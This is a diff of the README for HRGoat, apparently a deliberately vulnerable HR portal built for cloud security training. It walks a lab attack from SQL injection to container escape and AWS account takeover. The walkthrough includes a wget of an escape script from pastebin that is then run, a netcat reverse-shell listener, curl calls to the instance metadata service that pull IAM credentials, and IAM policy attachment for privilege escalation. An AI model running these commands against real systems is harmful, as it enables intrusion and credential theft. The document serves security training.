@@ -1,5 +1,6 @@
+## ⚠️ Security Advisory
+**WARNING**: This application contains deliberate security vulnerabilities. Deploy only in isolated, controlled environments. Never use in production or connect to sensitive systems.
 
-<<<<<<< HEAD
 ## About the Project
 HRGoat is an intentionally vulnerable HR management portal designed to demonstrate cloud security vulnerabilities in a controlled environment. It's a comprehensive training tool created for:
 - Security professionals practicing cloud-based exploitation
@@ -7,27 +8,13 @@ HRGoat is an intentionally vulnerable HR management portal designed to demonstra
 - Development teams studying secure coding
 - Organizations conducting security awareness training
 
-## ⚠️ Security Advisory
-**WARNING**: This application contains deliberate security vulnerabilities. Deploy only in isolated, controlled environments. Never use in production or connect to sensitive systems.
+---
 
-## Project Structure
-```
-/
-├── src/               # Frontend application code (React)
-├── server/            # Backend server code (Node.js/Express)
-├── terraform/         # Infrastructure as Code for AWS deployment
-└── .github/workflows/ # CI/CD pipelines for automated deployment
-```
+# 🎭 The Great Escape: From SQLi to Full AWS Takeover
 
-## Features
-- Employee management (create, update, delete, bulk upload)
-- Document handling and storage
-- User authentication and authorization
-- Profile management
-- Calendar events
-- Payroll & benefits
-- Performance tracking
-- Notifications
+> This project is for educational and authorized security research purposes only. Unauthorized use of these techniques is illegal and unethical.
+
+This guide walks through a full attack lifecycle scenario from initial entry via SQL Injection to full AWS account takeover, including container escape, IAM privilege escalation, and persistence.
 
 ## Deployment with GitHub Actions
 
@@ -52,41 +39,27 @@ HRGoat is an intentionally vulnerable HR management portal designed to demonstra
    - EC2 instance IP addresses
    - Jenkins server URL
 
-## Vulnerability Overview & Exploitation Guide
+---
 
-### 1. SQL Injection
-**Location**: Employee search functionality
-**Impact**: Data exposure, potential database compromise
+## 🧨 Vulnerability Overview
 
-### 2. Insecure Deserialization
-**Location**: Employee bulk upload feature
-**Impact**: Remote code execution on application container
+1. **SQL Injection** – Employee search functionality can be exploited for unauthorized data access.
+2. **Insecure Deserialization** – Bulk upload feature leads to remote code execution.
+3. **Container Escape** – Poor container isolation allows attacker to pivot to EC2 host.
+4. **Jenkins Exploitation** – Publicly exposed CI/CD tool allows system-level compromise.
+5. **AWS IAM Privilege Escalation** – Misconfigured roles allow privilege chaining and admin policy attachment.
 
-### 3. Container Escape
-**Location**: Docker container configuration
-**Impact**: Host system access from container
+---
 
-### 4. Jenkins Exploitation
-**Location**: Jenkins instance (port 8080)
-**Impact**: CI/CD pipeline compromise
+## 🔥 Exploitation Walkthrough
 
-### 5. Privilege Escalation
-**Location**: EC2 & Jenkins instances
-**Impact**: Full system compromise
+*A detailed, step-by-step demonstration of exploiting these vulnerabilities is provided in the `docs/exploitation-walkthrough.md` file.* Screenshots, reverse shells, metadata token access, IAM abuse, and persistence techniques are covered thoroughly.
 
-### 6. AWS IAM Privilege Escalation
-**Location**: EC2 instance roles
-**Impact**: AWS account compromise
-
-
+---
 
 ## Disclaimer
 This software is provided for educational purposes only. Unauthorized security testing is illegal. The author is not responsible for any misuse of this software.
-=======
-# 🎭 The Great Escape: From SQLi to Full AWS Takeover
 
-## ⚠️ Disclaimer
-> This project is for educational and authorized security research purposes only. Unauthorized use of these techniques is illegal and unethical.
 
 ## 🏴‍☠️ The Adventure Begins
 Once upon a time, in a land of misconfigured cloud environments, a daring security researcher set out on a quest to explore the depths of vulnerabilities. What started as a simple SQL injection led to an ultimate privilege escalation inside AWS. Let's follow the trail!
@@ -139,10 +112,17 @@ If we see certain privilege bits set, it's time to break free! 🔓
 
 ## 🛠️ Step 4: Breaking Out of the Container
 
-Let's grab and execute the escape script, make sure to create new listener and change the IP and port number that within the script:
+Let's grab and execute the escape script, make sure to create new listener and change the IP and port number that within the script. 
+First navigate to the `examples` directory and find the script `container_escape_shell.sh`. Then, upload the script to PasteBin.com 
+Not Before you're changing the ATTACKER_IP and the REMOTE_IP parameters that within the script. 
+
+To use this script you need to create a new listener (you can create it on the same machine like before, just with different port,
+for example: `nc -nlvp 4445` The port before was 4444
 ```bash
 cd /tmp
-wget -O escape.sh https://pastebin.com/raw/YSbnzY2r
+
+wget -O escape.sh https://pastebin.com/raw/[your uploaded URL]
+// for example - wget -O escape.sh https://pastebin.com/raw/YSbnzY2r
 sed -i 's/\r$//' escape.sh
 chmod +x escape.sh
 ./escape.sh
@@ -210,7 +190,7 @@ We find permissions allowing us to list EC2 instances and send SSM commands. Per
 
 Let’s list EC2 instances:
 ```bash
-aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,Tags[?Key==`Name`].Value|[0]]' --output table
+aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId, Tags[?Key==`Name`].Value|[0], State.Name]' --output table
 ```
 ![image](https://github.com/user-attachments/assets/f90a2073-464d-4aba-a12e-bc7c90257fdf)
 
@@ -229,7 +209,7 @@ Now we have a shell on a second machine. Time to escalate further!
 From the new EC2 instance, repeat the credential extraction process:
 ```bash
 TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
-echo $TOKEN
+ROLE_NAME=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
 curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME
 ```
 ![image](https://github.com/user-attachments/assets/b0f2e89b-5297-4530-802b-ad7765f8f247)
@@ -253,6 +233,7 @@ aws iam attach-role-policy --role-name hrgoat-jenkins-role --policy-arn arn:aws:
 
 Check if it worked:
 ```bash
+aws iam list-attached-role-policies --role-name hrgoat-jenkins-role
 aws iam list-users
 ```
 ![image](https://github.com/user-attachments/assets/dbb2a40f-ea9c-4cd3-86ab-ba110ecc8b8b)
@@ -296,4 +277,3 @@ From a simple SQLi to full AWS environment control, we navigated through multipl
 ---
 
 💡 **For Defensive Countermeasures & Hardening Tips, see** `SECURITY.md` 🚧
->>>>>>> 0a0b584fe7b915f61e7a873a1b59c7a055d72ab9
